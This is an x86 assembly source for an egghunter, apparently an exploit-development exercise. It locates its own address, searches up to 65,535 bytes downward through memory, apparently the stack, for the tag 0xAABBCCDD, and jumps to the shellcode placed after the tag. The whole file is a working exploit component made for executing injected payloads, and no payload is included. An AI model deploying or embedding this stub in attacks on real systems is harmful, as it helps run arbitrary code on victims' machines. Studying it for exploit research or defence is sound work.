global _start

section .text
_start:

       jmp short call_abc

abc:
        pop edi                         ; load own address
        sub edi,36                      ; jump over egghunter code to avoid finding tag for searching
        mov eax,0xAABBCCDD              ; load tag 0xAABBCCDD
        xor ecx,ecx
        mov cx,0xFFFF                   ; search for max 2^16 bytes
        std                             ; set direction flag
                                        ;       -> scasd decrements edi
                                        ;       -> search towards lower emmory

search:
        ; search for tag at the stack
        scasd           ; compares string (dword) in eax and [edi], and increments/decrements
        jz exec         ; jump to shellcode if egg is found
        add edi,3       ; search after every byte instead of every 4 bytes to avoid alignment problems

        loop search


exec:
        ; edi = position of the start of the tag (AA of AABBCCDD) - 4
        add edi,8
        jmp edi                         ; jmp to shellcode

call_abc:
        call abc
